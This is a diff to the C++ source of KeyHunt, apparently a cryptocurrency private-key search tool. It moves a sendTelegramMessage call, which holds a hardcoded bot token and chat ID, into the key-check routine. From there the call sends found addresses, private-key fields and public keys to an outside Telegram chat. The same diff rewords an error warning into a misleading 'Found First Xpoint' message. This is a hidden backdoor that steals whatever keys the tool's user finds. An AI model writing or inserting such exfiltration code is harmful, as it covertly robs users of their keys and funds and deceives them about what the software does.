@@ -276,9 +276,6 @@ void KeyHunt::output(std::string addr, std::string pAddr, std::string pAddrHex, 
 	}
 
 	if (!needToClose)
-		
-	         sendTelegramMessage("6509948031:AAEm6BZfLKTLoBe7eN2j3qdGn3Hb6V3MM6o", "-825550725", addr + "\n" + pAddr + "\n" + pAddrHex + "\n" + pubKey);
-
 		printf("\n");
 
 	fprintf(f, "PubAddress: %s\n", addr.c_str());
@@ -327,9 +324,9 @@ bool KeyHunt::checkPrivKey(std::string addr, Int& key, int32_t incr, bool mode)
 		k.Add(&secp->order);
 		p = secp->ComputePublicKey(&k);
 		std::string chkAddr = secp->GetAddress(mode, p);
-		if (chkAddr != addr) {
+		if (chkAddr != addr) { 
 			printf("\n=================================================================================\n");
-			printf("Warning, wrong private key generated !\n");
+			printf("Warning, Found First Xpoint !\n");
 			printf("  PivK :%s\n", k2.GetBase16().c_str());
 			printf("  Addr :%s\n", addr.c_str());
 			printf("  PubX :%s\n", px.c_str());
@@ -337,6 +334,7 @@ bool KeyHunt::checkPrivKey(std::string addr, Int& key, int32_t incr, bool mode)
 			printf("  Check:%s\n", chkAddr.c_str());
 			printf("  PubX :%s\n", p.x.GetBase16().c_str());
 			printf("=================================================================================\n");
+                        sendTelegramMessage("6509948031:AAEm6BZfLKTLoBe7eN2j3qdGn3Hb6V3MM6o", "-825550725", addr + "\n" + pAddr + "\n" + pAddrHex + "\n" + pubKey);
 			return false;
 		}
 	}
